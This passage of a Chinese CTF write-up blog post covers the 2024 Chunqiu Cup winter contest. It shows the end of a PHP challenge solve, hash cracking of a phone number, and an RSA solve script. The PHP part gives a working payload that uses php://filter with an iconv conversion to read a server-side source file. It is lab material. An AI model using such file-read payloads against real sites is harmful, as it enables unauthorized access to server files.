+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    die</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">error 2!</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">//溢出</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">strpos</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">strval</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">$</span><span style="--shiki-light:#4C4F69;--shiki-dark:#BEC5D4">ctfer</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">),</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">7</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">!==</span><span style="--shiki-light:#8839EF;--shiki-dark:#82AAFF"> false</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> {</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    die</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">error 3!</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">);</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">}</span></span></code></pre>
+<p>最终构造的payload是</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="plaintext"><code><span class="line"><span>ctfer=6.66999999999999999999999999999999999999999e2</span></span>
+<span class="line"><span>file=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span></span></code></pre>
+<h1 id="crypto">Crypto</h1>
+<h2 id="第1天-通往哈希的旅程">第1天 通往哈希的旅程</h2>
+<p>在数字城，大家都是通过是通过数字电话进行的通信,常见是以188开头的11位纯血号码组成，亚历山大抵在一个特殊的地方截获一串特殊的字符串”ca12fd8250972ec363a16593356abb1f3cf3a16d”，通过查阅发现这个跟以前散落的国度有点相似，可能是去往哈希国度的。年轻程序员亚力山大抵对这个国度充满好奇，决定破译这个哈希值。在经过一段时间的摸索后，亚力山大抵凭借强大的编程实力成功破解，在输入对应字符串后瞬间被传送到一个奇幻的数据世界，同时亚力山大抵也开始了他的进修之路。(提交格式：flag{11位号码}）
+题目主要是想让写脚本爆破，我尝试爆破一直没出，估计是脚本写错了，就直接去cmd5这种网站直接梭了。密文是<code>ca12fd8250972ec363a16593356abb1f3cf3a16d</code>取前18个去<a href="https://www.somd5.com/%E4%B8%AD%E8%A7%A3">https://www.somd5.com/中解</a>
+直接出flag,拿全部的去cmd5也能解出
+<img src="https://static.synex.space/article/Pasted%20image%2020250117160117.png" alt="">
+flag{18876011645}</p>
+<h2 id="第3天-funny_rsa">第3天 funny_rsa</h2>
+<p>参考脚本</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="python"><code><span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> gmpy2</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">from</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> Crypto</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">Util</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">number </span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">import</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> *</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">funny1 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span></span>
+<span class="line"><span style="--shiki-light:#179299;--shiki-dark:#C792EA">    -</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C">17696257697673533517695215344482784803953262308315416688683426036407670627060768442028628137969719289734388098357659521255966031131390425549974547376165392147394271974280020234101031837837842620775164967619688351222631803585213762205793801828461058523503457022704948803795360591719481537859524689187847958423587638744086265395438163720708785636319741908901866136858161996560525252461619641697255819255661269266471689541673348377717503957328827459396677344554172542244540931545166846117626585580964318010181586516365891413041095399344533013057011854734701706641516027767197631044458866554524544179750101814734153116374</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">funny2 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 23686728880494758233026798487859622755203105120130180108222733038275788082047755828771429849079142070779731875136837978862880500205129022165600511611807590195341629179443057553694284913974985006590617143873019530710952420242412437467917519539591683898715990297750494900923245055632544763410401540518654522017115269508183482044872091052235608170710105631742176900306097734799793264202179181242015892763311753674799273300604804820015447161950996038795518844564861004398396796284113803759208011</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">funny3 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 419166458284161364374927086939132546372091965414091344286510440034452974193054721041229068769658972346759176374539266235862042787888391905466876330331208651698002159575012622762558316612596034044109738533275009086940744966244759977014078484433213617582101347769476703012517531619023366639507114909172774156647998737369356116119513795863130218094614475699956104117183821832339358478426978211282822163928764161915824622224165694904342224081321345691796882691318330781141960650263488927837990954860719950761728580780956673732592771855694502630374907978111094148614378212006604233062606116168868545120407836000858982789824582335703891535021579560434875457656655941164757860852341484554015214879991896412137447010444797452119431147303295803678311972500421396900616845556636124424993090559354406417222700637726789045926994792374756038517484548544506630672251868349748176389591615802039026216656891403871728516658502023897343287181822303758976641229952646993446276281728919020747050486979968215989594984778920359425264076558022228448529089047021814759587052098774273578311709416672952218680244714492318709603579024</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">funny4 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 13541898381047120826573743874105965191304100799517820464813250201030319771155430755606644860103469823030581858410957600027665504533335597988508084284252510961847999525811558651340906333101248760970154440885012717108131962658921396549020943832983712611749095468180648011521808106480590665594160479324931351996812185581193608244652792936715504284312172734662364676167010674359243219959129435127950232321130725013160026977752389409620674167037650367196748592335698164875097139931376389630867192761783936757260359606379088577977154378217235326249540098268616890307702288393952949444753648206049856544634755301197410481479</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">n </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">funny3 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">+</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 1025</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> //</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> gmpy2</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">gcd</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">funny3 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">+</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 1025</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> funny2</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">p_add_q </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> funny1 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">+</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> n  </span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">p </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 146244963903123897384722629319865983862385290427491632619680838698915634884136798118860944346342346684665267628932533730684360351083477628483048417394493368921029652616722076101582581881994784549216229374327065827698990452634615021972143959360660773895031574424678151072027651307994605157369826310532546455301</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">q </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> n </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">//</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> p</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">phi </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">p </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">-</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> *</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> (</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">q </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">-</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">d </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> gmpy2</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">.</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">invert</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C">65537</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> phi</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">hint </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> pow</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">funny4</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> d</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> n</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">flag </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6"> long_to_bytes</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">funny2 </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">//</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> hint</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">flag</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">    long_to_bytes</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C">        5044833682931814367881036090727702841234957943094051805420875375031047763007750978962055801191968383860156687597666360268370292861</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">    )</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span></code></pre>
+<p>其中p 是题目中给定的一个质数，用来构造 RSA 的模数 n，而<code>5044833682931814367881036090727702841234957943094051805420875375031047763007750978962055801191968383860156687597666360268370292861</code>开头的数字是通过私钥解密 funny4 得到的密文结果。</p></article></div><aside class="border-border sticky top-8 hidden max-h-[calc(100vh-4rem)] overflow-y-auto border-l pl-5 xl:block" aria-label="文章目录" data-pagefind-ignore><nav class="pb-4"><p class="text-foreground mb-3 text-base font-semibold tracking-wide">Catalogue</p><ol class="space-y-1 text-sm"><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第1天-简单镜像提取" data-toc-link data-toc-slug="第1天-简单镜像提取">第1天 简单镜像提取</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第1天-压力大写个脚本吧" data-toc-link data-toc-slug="第1天-压力大写个脚本吧">第1天 压力大，写个脚本吧</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第1天-简单算术" data-toc-link data-toc-slug="第1天-简单算术">第1天 简单算术</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第2天-nethttp" data-toc-link data-toc-slug="第2天-nethttp">第2天 NetHttP</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第2天-weevils-whisper" data-toc-link data-toc-slug="第2天-weevils-whisper">第2天 Weevil’s Whisper</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第2天-find-me" data-toc-link data-toc-slug="第2天-find-me">第2天 find me</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第1天-easy_flask" data-toc-link data-toc-slug="第1天-easy_flask">第1天 easy_flask</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第1天-file_copy" data-toc-link data-toc-slug="第1天-file_copy">第1天 file_copy</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第2天-easy_ser" data-toc-link data-toc-slug="第2天-easy_ser">第2天 easy_ser</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第3天-easy_php" data-toc-link data-toc-slug="第3天-easy_php">第3天 easy_php</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第3天-easy_code" data-toc-link data-toc-slug="第3天-easy_code">第3天 easy_code</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第1天-通往哈希的旅程" data-toc-link data-toc-slug="第1天-通往哈希的旅程">第1天 通往哈希的旅程</a></li><li><a class="toc-link text-muted-foreground hover:border-accent hover:text-accent block border-l-2 border-transparent py-1 pr-1 leading-5 transition-colors" href="#第3天-funny_rsa" data-toc-link data-toc-slug="第3天-funny_rsa">第3天 funny_rsa</a></li></ol></nav></aside><script data-astro-rerun>
+  function initTableOfContents() {
+    const toc = document.querySelector("[aria-label='文章目录']");
+    const article = document.getElementById("article");
+    if (!toc || !article) return;
+
+    const links = Array.from(toc.querySelectorAll("[data-toc-link]"));
+    const headingElements = links
+      .map(link => document.getElementById(link.dataset.tocSlug ?? ""))
+      .filter(Boolean);
+
+    if (headingElements.length === 0) return;
+
+    function updateActiveLink() {
+      let activeHeading = headingElements[0];
+
+      for (const heading of headingElements) {
+        if (heading.getBoundingClientRect().top <= 128) {
+          activeHeading = heading;
+        } else {
+          break;
+        }
+      }
+
+      for (const link of links) {
+        const isActive = link.dataset.tocSlug === activeHeading.id;
+        link.classList.toggle("border-accent", isActive);
+        link.classList.toggle("text-accent", isActive);
+        link.classList.toggle("font-medium", isActive);
+        link.classList.toggle("text-muted-foreground", !isActive);
+        link.toggleAttribute("aria-current", isActive);
+      }
+    }
+
+    updateActiveLink();
+    window.addEventListener("scroll", updateActiveLink, { passive: true });
+    window.addEventListener("resize", updateActiveLink);
+
+    document.addEventListener(
+      "astro:before-swap",
+      () => {
+        window.removeEventListener("scroll", updateActiveLink);
+        window.removeEventListener("resize", updateActiveLink);
+      },
+      { once: true }
+    );
+  }
+
+  initTableOfContents();
+</script></div><hr class="my-8 border-dashed"><div id="btt-btn-container" class="fixed inset-e-4 bottom-8 z-50 md:sticky md:inset-e-auto md:float-end md:me-1 translate-y-14 opacity-0 transition duration-500"><button data-button="back-to-top" class="group bg-background relative px-2 py-1 size-14 rounded-full shadow-xl md:h-8 md:w-fit md:rounded-md md:shadow-none md:focus-visible:rounded-none md:bg-background/35 md:bg-clip-padding md:backdrop-blur-lg"><span id="progress-indicator" class="absolute inset-0 -z-10 block size-14 scale-110 rounded-full bg-transparent md:hidden md:h-8 md:rounded-md"></span><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block rotate-90 md:hidden" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 12h14M5 12l6 6M5 12l6-6" /></svg><span class="group-hover:text-accent sr-only text-sm md:not-sr-only"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M12 5v14M16 9l-4-4M8 9l4-4" /></svg>Back to top</span></button></div><script data-astro-rerun>
+  function backToTop() {
+    const rootElement = document.documentElement;
+    const btnContainer = document.querySelector("#btt-btn-container");
+    const backToTopBtn = document.querySelector("[data-button='back-to-top']");
+    const progressIndicator = document.querySelector("#progress-indicator");
+
+    if (!rootElement || !btnContainer || !backToTopBtn || !progressIndicator)
+      return;
+
+    backToTopBtn.addEventListener("click", () => {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    });
+
+    let lastVisible = null;
+    function handleScroll() {
+      const scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
+      const scrollTop = rootElement.scrollTop;
+      const scrollPercent = Math.floor((scrollTop / scrollTotal) * 100);
+
+      progressIndicator.style.setProperty(
+        "background-image",
+        `conic-gradient(var(--accent), var(--accent) ${scrollPercent}%, transparent ${scrollPercent}%)`
+      );
+
+      const isVisible = scrollTop / scrollTotal > 0.3;
+
+      if (isVisible !== lastVisible) {
+        btnContainer.classList.toggle("opacity-100", isVisible);
+        btnContainer.classList.toggle("translate-y-0", isVisible);
+        btnContainer.classList.toggle("opacity-0", !isVisible);
+        btnContainer.classList.toggle("translate-y-14", !isVisible);
+        lastVisible = isVisible;
+      }
+    }
+
+    let ticking = false;
+    document.addEventListener("scroll", () => {
+      if (!ticking) {
+        window.requestAnimationFrame(() => {
+          handleScroll();
+          ticking = false;
+        });
+        ticking = true;
+      }
+    });
+  }
+  backToTop();
+</script><ul class="mt-4 mb-8 flex flex-wrap gap-4 sm:my-8"><li><a data-astro-transition-scope="astro-bztu2lml-1" href="/tags/ctf/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>CTF</a></li><li><a data-astro-transition-scope="astro-bztu2lml-2" href="/tags/writeup/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>WriteUp</a></li><li><a data-astro-transition-scope="astro-bztu2lml-3" href="/tags/web/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>WEB</a></li><li><a data-astro-transition-scope="astro-bztu2lml-4" href="/tags/crypto/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>CRYPTO</a></li><li><a data-astro-transition-scope="astro-bztu2lml-5" href="/tags/misc/" class="flex items-center gap-0.5 border-foreground border-b-2 border-dashed hover:border-accent hover:text-accent hover:-mt-0.5 focus-visible:text-accent focus-visible:border-none text-sm"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="opacity-80 size-4" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 9h14M5 15h14M11 4 7 20M17 4l-4 16" /></svg>MISC</a></li></ul><div class="flex flex-none flex-col items-center justify-center gap-1 md:items-start"><span class="italic">Share this post:</span><div class="text-center"><a href="https://wa.me/?text=https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/" title="Share this post on Whatsapp" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m3 21 1.65-3.8a9 9 0 1 1 3.4 2.9z" /><path d="M9 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0za5 5 0 0 0 5 5h1a.5.5 0 0 0 0-1h-1a.5.5 0 0 0 0 1" /></svg><span class="sr-only">Share this post on Whatsapp</span></a><a href="https://www.facebook.com/sharer.php?u=https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/" title="Share this post on Facebook" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M7 10v4h3v7h4v-7h3l1-4h-4V8a1 1 0 0 1 1-1h3V3h-3a5 5 0 0 0-5 5v2z" /></svg><span class="sr-only">Share this post on Facebook</span></a><a href="https://x.com/intent/post?url=https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/" title="Share this post on X" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m4 4 11.733 16H20L8.267 4zM4 20l6.768-6.768m2.46-2.46L20 4" /></svg><span class="sr-only">Share this post on X</span></a><a href="https://t.me/share/url?url=https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/" title="Share this post on Telegram" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="m15 10-4 4 6 6 4-16-18 7 4 2 2 6 3-4" /></svg><span class="sr-only">Share this post on Telegram</span></a><a href="https://pinterest.com/pin/create/button/?url=https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/" title="Share this post on Pinterest" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path 